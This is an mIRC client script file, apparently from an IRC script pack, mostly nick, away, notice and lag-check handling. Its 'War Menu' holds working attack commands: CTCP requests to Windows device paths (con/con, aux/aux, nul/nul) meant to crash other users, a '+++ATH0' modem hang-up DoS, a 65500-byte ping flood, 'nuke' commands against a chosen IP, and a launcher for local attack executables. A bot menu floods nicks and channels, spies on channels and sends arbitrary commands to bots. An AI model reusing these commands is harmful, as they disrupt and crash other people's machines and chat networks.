[script]
n0=Away/Nickmenu nicklist {
n1=  War Menu
n2=  .Drop MSChat
n3=  ..Drop Room CON:/ctcp # sound /con/con.wav
n4=  ..Drop $snick(#,1) CON:/ctcp $snick(#,1) sound /con/con.wav
n5=  ..Drop ? CON:/ctcp $$?="Drop Who?" sound /con/con.wav
n6=  ..-
n7=  ..Drop Room AUX:/ctcp # sound /aux/aux.wav
n8=  ..Drop $snick(#,1) AUX:/ctcp $snick(#,1) sound /aux/aux.wav
n9=  ..Drop ? AUX:/ctcp $$?="Drop Who?" sound /aux/aux.wav
n10=  ..-
n11=  ..Drop Room NUL:/ctcp # sound /nul/nul.wav
n12=  ..Drop $snick(#,1) NUL:/ctcp $snick(#,1) sound /nul/nul.wav
n13=  ..Drop ? NUL:/ctcp $$?="Drop Who?" sound /nul/nul.wav
n14=  .Hup Server
n15=  ..HUP $snick(#,1):hup $snick(#,1) | $report(Sending Server HUP Ping to $snick(#,1)).active
n16=  ..HUP Given:var %temp = $$?="Enter the nick to HUP" | hup %temp | $report(Sending Server HUP Ping to %temp).active
n17=  .Hup Dos
n18=  ..HUP $deathip:run $mircdirwar\hup $deathip 20 64 +++ATH0 | $report(Sending DOS HUP Ping to $deathip).active
n19=  ..HUP Given:var %temp = $$?="IP to HUP" | run $mircdirwar\hup %temp 20 64 +++ATH0 | $report(Sending DOS HUP Ping to %temp).active
n20=  .Unmask Selected:unmask $deathip $snick(#,1)
n21=  .-
n22=  .DOS Ping Flood:/run ping -t -l 65500 -v 8 -w 100 $$?="Enter IP to flood:"
n23=  .Gate Scan $snick(#,1) $+ : { scan $snick(#,1) $gettok($address($snick(#,1),0),2,64) }
n24=  .$weapons
n25=  ..There Are $findfile($mircdirwar,*.exe,0) Weapons:halt
n26=  .. $+ $nopath($findfile($mircdirwar,*.exe,1)) $+ :run $findfile($mircdirwar,*.exe,1)
n27=  .. $+ $nopath($findfile($mircdirwar,*.exe,2)) $+ :run $findfile($mircdirwar,*.exe,2)
n28=  .. $+ $nopath($findfile($mircdirwar,*.exe,3)) $+ :run $findfile($mircdirwar,*.exe,3)
n29=  .. $+ $nopath($findfile($mircdirwar,*.exe,4)) $+ :run $findfile($mircdirwar,*.exe,4)
n30=  .. $+ $nopath($findfile($mircdirwar,*.exe,5)) $+ :run $findfile($mircdirwar,*.exe,5)
n31=  .. $+ $nopath($findfile($mircdirwar,*.exe,6)) $+ :run $findfile($mircdirwar,*.exe,6)
n32=  .. $+ $nopath($findfile($mircdirwar,*.exe,7)) $+ :run $findfile($mircdirwar,*.exe,7)
n33=  .. $+ $nopath($findfile($mircdirwar,*.exe,8)) $+ :run $findfile($mircdirwar,*.exe,8)
n34=  .. $+ $nopath($findfile($mircdirwar,*.exe,9)) $+ :run $findfile($mircdirwar,*.exe,9)
n35=  .. $+ $nopath($findfile($mircdirwar,*.exe,10)) $+ :run $findfile($mircdirwar,*.exe,10)
n36=  .. $+ $nopath($findfile($mircdirwar,*.exe,11)) $+ :run $findfile($mircdirwar,*.exe,11)
n37=  .. $+ $nopath($findfile($mircdirwar,*.exe,12)) $+ :run $findfile($mircdirwar,*.exe,12)
n38=  .. $+ $nopath($findfile($mircdirwar,*.exe,13)) $+ :run $findfile($mircdirwar,*.exe,13)
n39=  .. $+ $nopath($findfile($mircdirwar,*.exe,14)) $+ :run $findfile($mircdirwar,*.exe,14)
n40=  .. $+ $nopath($findfile($mircdirwar,*.exe,15)) $+ :run $findfile($mircdirwar,*.exe,15)
n41=  .. $+ $nopath($findfile($mircdirwar,*.exe,16)) $+ :run $findfile($mircdirwar,*.exe,16)
n42=  .. $+ $nopath($findfile($mircdirwar,*.exe,17)) $+ :run $findfile($mircdirwar,*.exe,17)
n43=  .. $+ $nopath($findfile($mircdirwar,*.exe,18)) $+ :run $findfile($mircdirwar,*.exe,18)
n44=  .. $+ $nopath($findfile($mircdirwar,*.exe,19)) $+ :run $findfile($mircdirwar,*.exe,19)
n45=  -
n46=  Away/Nick Menus
n47=  .Away Menu
n48=  ..Set Away:/away
n49=  ..Set Away new message:/away $$?="Enter your away message:"
n50=  ..Set BRB:/away BRB
n51=  ..Set Back:/BACK
n52=  ..-
n53=  ..Read Away Messages:/away.message.read READ
n54=  ..Delete Away Messages:/away.message.read DELETE
n55=  .Nick Menu
n56=  ..Change Nick:/nick $$?="Enter your new nickname:"
n57=  ..Recent Nicks
n58=  ... $+ $key(settings,savednick1) $+ :nick $key(settings,savednick1)
n59=  ... $+ $key(settings,savednick2) $+ :nick $key(settings,savednick2)
n60=  ... $+ $key(settings,savednick3) $+ :nick $key(settings,savednick3)
n61=  ... $+ $key(settings,savednick4) $+ :nick $key(settings,savednick4)
n62=  ...-
n63=  ... $+ $gettok($key(settings,nicklist),1,44) $+ :nick $gettok($key(settings,nicklist),1,44)
n64=  ... $+ $gettok($key(settings,nicklist),2,44) $+ :nick $gettok($key(settings,nicklist),2,44)
n65=  ... $+ $gettok($key(settings,nicklist),3,44) $+ :nick $gettok($key(settings,nicklist),3,44)
n66=  ... $+ $gettok($key(settings,nicklist),4,44) $+ :nick $gettok($key(settings,nicklist),4,44)
n67=  ... $+ $gettok($key(settings,nicklist),5,44) $+ :nick $gettok($key(settings,nicklist),5,44)
n68=  ... $+ $gettok($key(settings,nicklist),6,44) $+ :nick $gettok($key(settings,nicklist),6,44)
n69=  ... $+ $gettok($key(settings,nicklist),7,44) $+ :nick $gettok($key(settings,nicklist),7,44)
n70=  ... $+ $gettok($key(settings,nicklist),8,44) $+ :nick $gettok($key(settings,nicklist),8,44)
n71=  ... $+ $gettok($key(settings,nicklist),9,44) $+ :nick $gettok($key(settings,nicklist),9,44)
n72=  ... $+ $gettok($key(settings,nicklist),10,44) $+ :nick $gettok($key(settings,nicklist),10,44)
n73=  ..Random Nickname:/rand
n74=  ..Auto Nick Changer
n75=  ...Start Nick Changer:/nicktime
n76=  ...Stop Nick Changer:.timerNick. $+ $network OFF | /set %nicktime.active OFF | $report(Nick Change,$null,$null,Timer has been halted).chan
n77=  ...Set Timer Method $key(settings,nicktime.type)
n78=  ....Random:keywrite settings nicktime.type RAND | setupshow Random Nick Method $key(settings,nicktime.type)
n79=  ....List:keywrite settings nicktime.type LIST | setupshow Random Nick Method $key(settings,nicktime.type)
n80=  ..Nick Recovery Options
n81=  ...Recover Nick:keywrite settings recover $$?="Enter nick to recover" | recover
n82=  ...Stop Recover: keywrite settings recover ""
n83=  ..Set Saved Nicks
n84=  ...Set Saved Nick One:keywrite settings savednick1 $$?="Enter the first saved nickname" | setupshow $key(settings,savednick1) | halt
n85=  ...Set Saved Nick Two:keywrite settings savednick2 $$?="Enter the second saved nickname" | setupshow $key(settings,savednick2) | halt
n86=  ...Set Saved Nick Three:keywrite settings savednick3 $$?="Enter the third saved nickname" | setupshow $key(settings,savednick3) | halt
n87=  ...Set Saved Nick Four:keywrite settings savednick4 $$?="Enter the fourth saved nickname" | setupshow $key(settings,savednick4) | halt
n88=  -
n89=  $BotMenu
n90=  .Period Commands
n91=  ..Q me:.msg # .q
n92=  ..Away:.msg # .away
n93=  ..Back:.msg # .back
n94=  ..Boss:.msg # .boss
n95=  ..Cycle:.msg # .cycle
n96=  ..Exit:.msg # .exit
n97=  ..Heel:.msg # .heel
n98=  ..Part:.msg # .part #
n99=  ..Pound:.msg # .pound $$?="Channel to Pound"
n100=  ..RemKey:.msg # .remkey
n101=  ..Stop Pound:.msg # .stop
n102=  ..Switch Names for $snick(#,1) $+ :.msg # .switch $snick(#,1) $$?="Enter the Bot's new nick"
n103=  .Spy Options
n104=  ..Server Spy
n105=  ...Spy ON Send this channel:.msg # .serverspy on send #
n106=  ...Spy ON Send other channel:.msg # .serverspy on send $$?="Channel to spy on"
n107=  ...Spy ON Get:.msg # .serverspy on get
n108=  ...Spy ON Get Private:.msg # .serverspy on get BOSS
n109=  ...Spy OFF:.msg # .serverspy off
n110=  ..Normal Spy
n111=  ...Spy ON this channel:.msg # .spy on #
n112=  ...Spy ON other channel:.msg # .spy on $$?="Channel to spy on"
n113=  ...Spy OFF:.msg # .spy off
n114=  .Send Owner/Host key to $snick(#,1)
n115=  ..Owner key for # $+ :ctcp $snick(#,1) SAVEKEY O # $key(#,ownerkey)
n116=  ..Owner key for ? $+ :ctcp $snick(#,1) SAVEKEY O $$?="Channel to save it in" $$?="Key for channel"
n117=  ..-
n118=  ..Host key to # $+ :ctcp $snick(#,1) SAVEKEY H # $$?="Key for channel"
n119=  ..Host key for ? $+ :ctcp $snick(#,1) SAVEKEY H $$?="Channel to save it in" $$?="Key for channel"
n120=  .-
n121=  .Any mIRC Command to $snick(#,1) $+ :/ctcp $snick(#,1) DO $$?="Enter Command to this Bot"
n122=  .Rename the Bot $snick(#,1) $+ :/ctcp $snick(#,1) DO /nick $$?="Enter The New Nick"
n123=  .Any mIRC Command to all Bot's
n124=  ..Send Command X1:/bot.do $$?="Command to Send"
n125=  ..Send Command X6:/bot.kill $$?="Command to Send"
n126=  .-
n127=  .nuke
n128=  ..Win4Low: { nuke2 $$?=" ip to nuke?" }
n129=  ..Win4hard: { nukex $$?=" ip to nuke?" }
n130=  .-
n131=  .Flood at $snick(#,1) ( Selected Nick )
n132=  ..Op Tease Selected $snick(#,1) X4:bot.do //rt # $snick(#,1)
n133=  ..Ping $snick(#,1) X6:bot.kill //ctcp $snick(#,1) PING
n134=  ..Time $snick(#,1) X6:bot.kill //ctcp $snick(#,1) TIME
n135=  ..Version $snick(#,1) X6:bot.kill //ctcp $snick(#,1) VERSION
n136=  ..ClientInfo $snick(#,1) X6:bot.kill //ctcp $snick(#,1) CLIENTINFO
n137=  ..Hup $snick(#,1) X1:bot.do //hup $snick(#,1)
n138=  ..-
n139=  ..Deop $snick(#,1) $+ :ctcp $key(settings,botnick) DO //mode # -o $snick(#,1)
n140=  ..Kick $snick(#,1) $+ :ctcp $key(settings,botnick) DO //kick # $snick(#,1)
n141=  .-
n142=  .Flood On #
n143=  ..Ping # X6:bot.kill //ctcp # PING
n144=  ..Version # X6:bot.kill //ctcp # VERSION
n145=  ..ClientInfo # X6:bot.kill //ctcp # CLIENTINFO
n146=  ..Hup # X1:bot.do //hup #
n147=  .-
n148=  .Bot's 1-10
n149=  ..Fire Up Bots 1-5:.set.bot 1 | .set.bot 2 | .set.bot 3 | .set.bot 4 | .set.bot 5
n150=  ..-
n151=  ..Fire Up Bot 1:.set.bot 1
n152=  ..Fire Up Bot 2:.set.bot 2
n153=  ..Fire Up Bot 3:.set.bot 3
n154=  ..Fire Up Bot 4:.set.bot 4
n155=  ..Fire Up Bot 5:.set.bot 5
n156=  ..-
n157=  ..Fire Up Bots 6-10:.set.bot 6 | .set.bot 7 | .set.bot 8 | .set.bot 9 | .set.bot 10
n158=  ..-
n159=  ..Fire Up Bot 6:.set.bot 6
n160=  ..Fire Up Bot 7:.set.bot 7
n161=  ..Fire Up Bot 8:.set.bot 8
n162=  ..Fire Up Bot 9:.set.bot 9
n163=  ..Fire Up Bot 10:.set.bot 10
n164=  .Bots 11-20
n165=  ..Fire Up Bots 11-15:.set.bot 11 | .set.bot 12 | .set.bot 13 | .set.bot 14 | .set.bot 15
n166=  ..-
n167=  ..Fire Up Bot 11:.set.bot 11
n168=  ..Fire Up Bot 12:.set.bot 12
n169=  ..Fire Up Bot 13:.set.bot 13
n170=  ..Fire Up Bot 14:.set.bot 14
n171=  ..Fire Up Bot 15:.set.bot 15
n172=  ..-
n173=  ..Fire Up Bots 16-20:.set.bot 16 | .set.bot 17 | .set.bot 18 | .set.bot 19 | .set.bot 20
n174=  ..-
n175=  ..Fire Up Bot 16:.set.bot 16
n176=  ..Fire Up Bot 17:.set.bot 17
n177=  ..Fire Up Bot 18:.set.bot 18
n178=  ..Fire Up Bot 19:.set.bot 19
n179=  ..Fire Up Bot 20:.set.bot 20
n180=  .-
n181=  .Bot Setup Menu
n182=  ..Configure Bot Nicks:/set.bot.nicks
n183=  ..-
n184=  ..Fix Bot Reg: { 
n185=    keywrite settings botnick $snicks
n186=    var %temp = $$?="Enter the key to use for Bot's" | keywrite settings botkey %temp | set.bot.key | .msg # .boss
n187=  }
n188=  ..-
n189=  ..Set Bot Key:var %temp = $$?="Enter the key to use for Bot's" | keywrite settings botkey %temp | set.bot.key | halt
n190=  ..-
n191=  ..Echo Current Bot Key: $report(Current Bot Key,$null,$null,$key(settings,botkey)).active
n192=  ..Echo Registered Bot's: $report(Current Registered Bot's,$null,$null,$replace($key(settings,botnick),$chr(44),$chr(160))).active
n193=  ..-
n194=  ..Clear Registered: keywrite settings botnick ""
n195=}
n196=#sswho off
n197=raw 352:*: {
n198=  inc %tempa
n199=  set %user $+ %tempa $strip($3)
n200=  set %host $+ %tempa $strip($4)
n201=  set %server $+ %tempa $strip($5)
n202=  set %handle $+ %tempa $strip($6-)
n203=  halt
n204=}
n205=raw 315:*: {
n206=  updatenl
n207=  if (%handle1 == $null) && ($master(settings,which.window) == Active) { $report(StrangeWho,$null,$null,The room is Empty  or set Secret).active | $report(StrangeWho,$null,$null,Or the User is Hidden or Not Online).active | $report($chain).active |  unset %handle* %user* %server* %host* %temp* | .disable #sswho | halt }
n208=  if (%handle1 == $null) && ($master(settings,which.window) == STATS) { $report(StrangeWho,$null,$null,The room is Empty  or set Secret).status | $report(StrangeWho,$null,$null,Or the User is Hidden or Not Online).status | $report($chain).status |  unset %handle* %user* %server* %host* %temp* | .disable #sswho | halt }
n209=  if (%handle1 == $null) && ($master(settings,which.window) == On) { aline @UserInfo $sys $white $+ StrangeWho: $lowcol $+ The room is $bright $+ Empty $lowcol $+ or set $bright $+ Secret  | aline @UserInfo $sys $white $+ StrangeWho: $lowcol $+ Or the User is $bright $+ Hidden $lowcol $+ or $bright $+ Not Online | aline @UserInfo $sys $+ $chain |  unset %handle* %user* %server* %host* %temp* | .disable #sswho | halt }
n210=  :sswholoop
n211=  if ($master(settings,which.window) == Active) {
n212=    $report(Info $+ %tempb,$null,$null,%handle [ $+ [ %tempb ] ] %user [ $+ [ %tempb ] ]  $+ @ $+ %host [ $+ [ %tempb ] ]).active
n213=    $report(Server,$null,$null,%server [ $+ [ %tempb ] ]).active
n214=    if (%tempb >= %tempa) {
n215=      $report($null,$null,Done).active
n216=      $report($chain).active
n217=      unset %handle* %user* %server* %host* %temp*
n218=      .disable #sswho
n219=      halt
n220=    }
n221=    else {  inc %tempb | goto sswholoop }
n222=  }
n223=  if ($master(settings,which.window) == On) {
n224=    aline @UserInfo $sys $highcol $+ Who Reply number $white $+ %tempb 
n225=    aline @UserInfo $sys $lowcol $+ Info: $highcol $+ %handle [ $+ [ %tempb ] ] %user [ $+ [ %tempb ] ]  $+ @ $+ %host [ $+ [ %tempb ] ]
n226=    aline @UserInfo $sys $lowcol $+ Server: $highcol $+ %server [ $+ [ %tempb ] ]
n227=    if (%tempb >= %tempa) {
n228=      aline @UserInfo $sys $bright $+ Done
n229=      aline @UserInfo $sys $+ $chain
n230=      unset %handle* %user* %server* %host* %temp*
n231=      .disable #sswho
n232=      halt
n233=    }
n234=    else {  inc %tempb | goto sswholoop }
n235=  }
n236=  else {
n237=    $report(Who Reply,$null,number,%tempb).status
n238=    $report(Handle,$null,$null,%handle [ $+ [ %tempb ] ] %user [ $+ [ %tempb ] ]  $+ @ $+ %host [ $+ [ %tempb ] ] ).status
n239=    $report(Serve,$null,$null,%server [ $+ [ %tempb ] ] ).status
n240=    if (%tempb >= %tempa) {
n241=      $report(Done).status
n242=      $report($chain).status
n243=      unset %handle* %user* %server* %host* %temp*
n244=      .disable #sswho
n245=      halt
n246=    }
n247=    else {  inc %tempb | goto sswholoop }
n248=  }
n249=}
n250=#sswho end
n251=menu @help1 {
n252=  dclick:{ if ($sline(@Help,1).ln > 2) && ($sline(@Help,1).ln < 10) { 
n253=      if ($sline(@Help,1).ln == 8) { run $mircdirmirc.hlp }
n254=      else { $strip($gettok($line(@Help,$sline(@Help,1).ln),2,32)) $strip($gettok($line(@Help,$sline(@Help,1).ln),3,32)) }
n255=    }
n256=  }
n257=  Refresh Window:window -c @Help | /help
n258=  Close Window:window -c @Help
n259=}
n260=menu @Help {
n261=  dclick: window -c @Help | /help
n262=  Refresh Window:window -c @Help | /help
n263=  Close Window:window -c @Help
n264=}
n265=dialog spot { 
n266=  title "Spot Talker Colors"
n267=  ;size -1 -1 190 258
n268=  size -1 -1 380 300
n269=  check "White", 1, 20 25 75 40 
n270=  check "Black", 2, 20 55 75 40 
n271=  check "Drk Blue", 3, 20 85 75 40 
n272=  check "Green", 4, 20 115 75 40 
n273=  check "Red", 5, 20 145 75 40 
n274=  check "Drk Red", 6, 20 175 75 40 
n275=  check "Purple", 7, 20 205 75 40 
n276=  check "Orange", 8, 20 235 75 40 
n277=  check "Yellow", 9, 100 25 75 40 
n278=  check "Lt Green", 10, 100 55 75 40 
n279=  check "Drk Cyan", 11, 100 85 75 40 
n280=  check "Lt Cyan", 12, 100 115 75 40 
n281=  check "Blue", 13, 100 145 75 40 
n282=  check "Lt Purple", 14, 100 175 75 40 
n283=  check "Drk Gray", 15, 100 205 75 40 
n284=  check "Gray", 16, 100 235 75 40
n285=  check "White", 17, 220 25 75 40 
n286=  check "Black", 18, 220 55 75 40 
n287=  check "Drk Blue", 19, 220 85 75 40 
n288=  check "Green", 20, 220 115 75 40 
n289=  check "Red", 21, 220 145 75 40 
n290=  check "Drk Red", 22, 220 175 75 40 
n291=  check "Purple", 23, 220 205 75 40 
n292=  check "Orange", 24, 220 235 75 40 
n293=  check "Yellow", 25, 300 25 75 40 
n294=  check "Lt Green", 26, 300 55 75 40 
n295=  check "Drk Cyan", 27, 300 85 75 40 
n296=  check "Lt Cyan", 28, 300 115 75 40 
n297=  check "Blue", 29, 300 145 75 40 
n298=  check "Lt Purple", 30, 300 175 75 40 
n299=  check "Drk Gray", 31, 300 205 75 40 
n300=  check "Gray", 32, 300 235 75 40
n301=  text "&First Letter:", 33, 20 6 100 30
n302=  text "&Last letters:", 34, 223 6 100 30
n303=  button "&Ok" 35, 20 275 340 20, OK default group
n304=}
n305=alias spotc { $dialog(spot,spot) }
n306=on *:dialog:spot:init:0: {
n307=  if ($master(settings,spot1) = 00) did -c spot 1
n308=  if ($master(settings,spot1) = 01) did -c spot 2
n309=  if ($master(settings,spot1) = 02) did -c spot 3  
n310=  if ($master(settings,spot1) = 03) did -c spot 4
n311=  if ($master(settings,spot1) = 04) did -c spot 5
n312=  if ($master(settings,spot1) = 05) did -c spot 6
n313=  if ($master(settings,spot1) = 06) did -c spot 7
n314=  if ($master(settings,spot1) = 07) did -c spot 8
n315=  if ($master(settings,spot1) = 08) did -c spot 9
n316=  if ($master(settings,spot1) = 09) did -c spot 10
n317=  if ($master(settings,spot1) = 10) did -c spot 11
n318=  if ($master(settings,spot1) = 11) did -c spot 12
n319=  if ($master(settings,spot1) = 12) did -c spot 13
n320=  if ($master(settings,spot1) = 13) did -c spot 14
n321=  if ($master(settings,spot1) = 14) did -c spot 15
n322=  if ($master(settings,spot1) = 15) did -c spot 16
n323=  if ($master(settings,spot2) = 00) did -c spot 17
n324=  if ($master(settings,spot2) = 01) did -c spot 18
n325=  if ($master(settings,spot2) = 02) did -c spot 19  
n326=  if ($master(settings,spot2) = 03) did -c spot 20
n327=  if ($master(settings,spot2) = 04) did -c spot 21
n328=  if ($master(settings,spot2) = 05) did -c spot 22
n329=  if ($master(settings,spot2) = 06) did -c spot 23
n330=  if ($master(settings,spot2) = 07) did -c spot 24
n331=  if ($master(settings,spot2) = 08) did -c spot 25
n332=  if ($master(settings,spot2) = 09) did -c spot 26
n333=  if ($master(settings,spot2) = 10) did -c spot 27
n334=  if ($master(settings,spot2) = 11) did -c spot 28
n335=  if ($master(settings,spot2) = 12) did -c spot 29
n336=  if ($master(settings,spot2) = 13) did -c spot 30
n337=  if ($master(settings,spot2) = 14) did -c spot 31
n338=  if ($master(settings,spot2) = 15) did -c spot 32
n339=}
n340=on *:dialog:spot:sclick:*:{
n341=  if ($did(1).state) masterwrite settings spot1 00
n342=  if ($did(2).state) masterwrite settings spot1 01
n343=  if ($did(3).state) masterwrite settings spot1 02
n344=  if ($did(4).state) masterwrite settings spot1 03
n345=  if ($did(5).state) masterwrite settings spot1 04
n346=  if ($did(6).state) masterwrite settings spot1 05
n347=  if ($did(7).state) masterwrite settings spot1 06
n348=  if ($did(8).state) masterwrite settings spot1 07
n349=  if ($did(9).state) masterwrite settings spot1 08
n350=  if ($did(10).state) masterwrite settings spot1 09
n351=  if ($did(11).state) masterwrite settings spot1 10
n352=  if ($did(12).state) masterwrite settings spot1 11
n353=  if ($did(13).state) masterwrite settings spot1 12
n354=  if ($did(14).state) masterwrite settings spot1 13
n355=  if ($did(15).state) masterwrite settings spot1 14
n356=  if ($did(16).state) masterwrite settings spot1 15
n357=  if ($did(17).state) masterwrite settings spot2 00
n358=  if ($did(18).state) masterwrite settings spot2 01
n359=  if ($did(19).state) masterwrite settings spot2 02
n360=  if ($did(20).state) masterwrite settings spot2 03
n361=  if ($did(21).state) masterwrite settings spot2 04
n362=  if ($did(22).state) masterwrite settings spot2 05
n363=  if ($did(23).state) masterwrite settings spot2 06
n364=  if ($did(24).state) masterwrite settings spot2 07
n365=  if ($did(25).state) masterwrite settings spot2 08
n366=  if ($did(26).state) masterwrite settings spot2 09
n367=  if ($did(27).state) masterwrite settings spot2 10
n368=  if ($did(28).state) masterwrite settings spot2 11
n369=  if ($did(29).state) masterwrite settings spot2 12
n370=  if ($did(30).state) masterwrite settings spot2 13
n371=  if ($did(31).state) masterwrite settings spot2 14
n372=  if ($did(32).state) masterwrite settings spot2 15
n373=}
n374=on ^*:SNOTICE:*:{
n375=  haltdef
n376=  if ($key(settings,onjoinpart.show) == OFF) { halt }
n377=  if ($1- = You need to say /quote PASS <password>) { bnc2 }
n378=  if ($1- = If this is your nickname, type: /PASS <password>) { .raw pass $readini($mircdirtext\PassWord.ini,n,$network,$me) }
n379=  if (*did a /whois on you* iswm $1-) { if ($master(settings,script.sound) == ON) { script.play whois.wav } | goto seewho }
n380=  if (*Client connecting* iswm $1-) {
n381=    if (*switch* iswm $1-) { goto seewho }
n382=    elseif (*uther* iswm $1-) { goto seewho }
n383=    else { if ($master(settings,script.sound) == ON) { script.play shit.wav }
n384=    }
n385=    ;if (*Client connecting at* iswm $1-) { ws 6 NOTICE Blitz :*** Notice -- Client connecting: $8 $9 $chr(91) $+ $remove($gettok($9,2,64),$chr(41)) $+ $chr(93) [clients] }
n386=    ;operserv raw NOTICE Blitz :*** Notice -- Client connecting: $8 $9 $chr(91) $+ $remove($gettok($9,2,64),$chr(41)) $+ $chr(93) [clients]
n387=  }
n388=  if (*Client exiting* iswm $1-) {
n389=    if (*switch* iswm $1-) { goto seewho }
n390=    elseif (*uther* iswm $1-) { goto seewho }
n391=    else { if ($master(settings,script.sound) == ON) { script.play logoff.wav } 
n392=    }
n393=  }
n394=  :seewho
n395=  echo $color(notice) -at $sys $+ $chr(186) $+ $net $+ $report(Server Notice,$null,$null,$1-)
n396=  if ($master(settings,extra.info) == ON) { IF (status !isin $window($active)) { echo $color(notice) -st $report(Server Notice,$null,$null,$1-) } }
n397=  halt
n398=}
n399=on ^*:NOTICE:*:*: {
n400=  if ($nick == OperServ) { goto noflood }
n401=  if ($nick == NickServ) && ($network != Undernet) { if (*NickServ IDENTIFY* iswm $1-) { auto.ident } | goto noflood }
n402=  if ($nick == ChanServ) { if (*ChanServ IDENTIFY* iswm $1-) { auto.room.ident $1- } | goto noflood }
n403=  if ($nick == MemoServ) { goto noflood }
n404=  if ($nick == HelpServ) && ($network == Dalnet) { goto noflood }
n405=  if ($nick == $server) { goto noflood }
n406=  if ($istok($key(settings,botnick),$nick,44) == $true) { goto noflood }
n407=  if ($key(settings,notice.hear) != ON) { 
n408=    .write -a $logdiraway.log $date(mm/dd/yyyy) $time(hh:nn:ss-TT) $network $nick Noticed: $iif($chr(40) $+ $chr(35) $+ * $+ $chr(41) iswm $1,$2-,$1-)
n409=    .notice $nick $report(Notices,OFF, $me is not accepting notices.,Auto-Ignore,Active)
n410=    .ignore -nu $+ $master(settings,ignore.length) $nick
n411=    halt
n412=  }
n413=  ssflood NOTICE $nick
n414=  :noflood
n415=  check.look $1-
n416=  if ($result == 1) { halt }
n417=  if ($key(settings,away.iam) == ON) && ($nick != $me) { if ($nick != ChanServ) && ($nick != NickServ) && ($nick != Memoserv) && ($nick != Operserv) { .write -a $logdiraway.log  $date(mm/dd/yyyy) $time(hh:nn:ss-TT) $network $nick Noticed: $1- } }
n418=  if ($chan == $null) {
n419=    echo $color(notice) -at NOTICE $+ $net $+ :  $+ 14 $+ $lll $+ $white $nick  $+ 14 $+ $rrr  $1-
n420=    if ($master(settings,extra.info) == ON) { IF (status !isin $window($active)) { echo $color(notice) -st NOTICE:  $+ 14 $+ $lll $+ $white $nick  $+ 14 $+ $rrr  $1- } }
n421=  }
n422=  if ($chan != $null) {
n423=    echo $color(notice) -at NOTICE $+ $net $+ :  $+ 14 $+ $lll $+ $white $nick 10 $+ $chr(91) $+  $bright $+ $chan 10 $+ $chr(93)  $+ 14 $+ $rrr  $1-
n424=    if ($master(settings,extra.info) == ON) { IF (status !isin $window($active)) { echo $color(notice) -st NOTICE:  $+ 14 $+ $lll $+ $white $nick 10 $+ $chr(91) $+  $bright $+ $chan 10 $+ $chr(93)  $+ 14 $+ $rrr  $1- } }
n425=  }
n426=  halt
n427=}
n428=on ^*:INVITE:#: { 
n429=  haltdef
n430=  if ($key(settings,invite.hear) != ON) { halt }
n431=  ssflood invite $nick
n432=  if ($nick != $me) {
n433=    keywrite settings lastinvite $chan
n434=    keywrite settings lastinvite.nick $nick
n435=  }
n436=  if ($nick == ChanServ) {
n437=    join $chan %key. [ $+ [ $chan ] ]
n438=    if ($master(settings,script.sound) == ON) { script.play invite.wav }
n439=    $report(Invite,AutoJoin,$nick,has just invited you to,$chan).active
n440=    halt
n441=  }
n442=  if ($master(settings,script.sound) == ON) { script.play invite.wav }
n443=  $report(Invite,$nick,$null,has just invited you to,$chan).active
n444=  $report(Invite,Press,$null,Control-F2 to join,Control-F3 to ignore.).active
n445=  halt
n446=}
n447=#lagcheck start
n448=alias Lgchk { .timer850. $+ $network 0 $key(settings,Lagmrcsecs) Lagchk }
n449=alias Lagchk { .raw Lag-CK $+ $chr(160) $+ $ticks }
n450=alias Lagon { keywrite settings lagchk ON | $report(Auto Lag Check,$null,$null,$key(settings,lagchk)).status | Lgchk }
n451=alias Lagoff { keywrite settings Lagchk OFF | $report(Auto Lag Check,$null,$null,$key(settings,lagchk)).status |  .timer850. $+ $network off | keywrite settings Lagmrc OFF }
n452=alias ShowLag { /mybar | return }
n453=alias Lagset { if ($1 == $null) { $report(Auto Lag Check syntax: /Lagset <seconds>).active | halt } | else { keywrite settings Lagmrcsecs $1 | $report(Set Auto Lag Check,$null,$null,$key(settings,Lagmrcsecs) seconds between).status | if %Lagchk == on { Lgchk } | halt } }
n454=raw 421:*: {
n455=  if (*Lag-CK* iswm $2) {
n456=    var %lag.mrc.tmp = ""
n457=    ;keywrite settings Lagmrc $calc($ticks - $gettok($2,2,160))
n458=    var %tmp.lag = $calc($ticks - $gettok($2,2,160))
n459=    if ($len(%tmp.lag) < 3) { keywrite settings Lagmrc .0 $+ %tmp.lag secs }
n460=    elseif ($len(%tmp.lag) = 3) { keywrite settings Lagmrc . $+ %tmp.lag secs }
n461=    elseif ($len(%tmp.lag) = 4) { keywrite settings Lagmrc $left(%tmp.lag,1) $+ . $+ $right(%tmp.lag,-1) secs }
n462=    elseif ($len(%tmp.lag) = 5) { keywrite settings Lagmrc $left(%tmp.lag,1) $+ . $+ $right(%tmp.lag,-1) secs }
n463=    elseif ($len(%tmp.lag) > 5) { keywrite settings Lagmrc ERROR }
n464=    if (%lag.mrc.tmp != $null) { lag.warn $gettok(%Lag.mrc,1,46) }
n465=    mybar
n466=    halt
n467=  }
n468=  if ($2 === IRCX) { halt }
n469=  $report(Server,$null,Error,Sorry,the command,$2,is an,$3-,to me.).active
n470=  if ($master(settings,extra.info) == ON) { IF (status !isin $window($active)) { $report(Server,$null,Error,Sorry,the command,$2,is an,$3-,to me.).status } }
n471=  halt
n472=}
n473=alias lag.warn {
n474=  if ($1 <= 1) { return }
n475=  if ($1 == 2) { $report(Lag Warning,$null,$null,Your lag is Questionable,$1, Seconds).active }
n476=  if ($1 == 3) { $report(Lag Warning,$null,$null,Your lag is Climbing,$1, Seconds).active }
n477=  if ($1 == 4) { $report(Lag Warning,$null,$null,Your lag is Suspect,$1, Seconds).active }
n478=  if ($1 > 4) { $report(Lag Warning,$null,$null,Your lag is High,$1, Seconds).active }
n479=  return
n480=}
n481=#lagcheck end
n482=#opscan off
n483=raw 352:*: {
n484=  %copdisplay $sys $6 $7 $5 $+ : $9-
n485=  halt
n486=}
n487=raw 315:*: {
n488=  updatenl
n489=  %copdisplay $sys $bright $+ Done
n490=  %copdisplay $sys $+ $chain
n491=  unset %copdisplay
n492=  .disable #opscan
n493=  halt
n494=}
n495=#opscan end
n496=raw 438:*: {
n497=  var %temp.nick.change = $2
n498=  $report(Nick Change,Time Wait,$null,Your nick will be auto changed in,$9, Seconds).status
n499=  .timerNick. $+ $network 1 $9 /nick %temp.nick.change
n500=  .timerNC. $+ $network 1 $9 $report(Nick Change,$null,$null,Auto-Changing your NickName to,%temp.nick.change).status
n501=  halt
n502=}
n503=raw 401:*: {
n504=  $report(Server,$null,Error,No Such Nick,$2).active
n505=  if (*#COS* iswm $1-) { join #COS | cycle #StrangeScript | $report(Server,$null,Cycle,Joining #COS and cycling #StrangeScript,raw 401 - script6.ini).active }
n506=  unset %handle
n507=  halt
n508=}
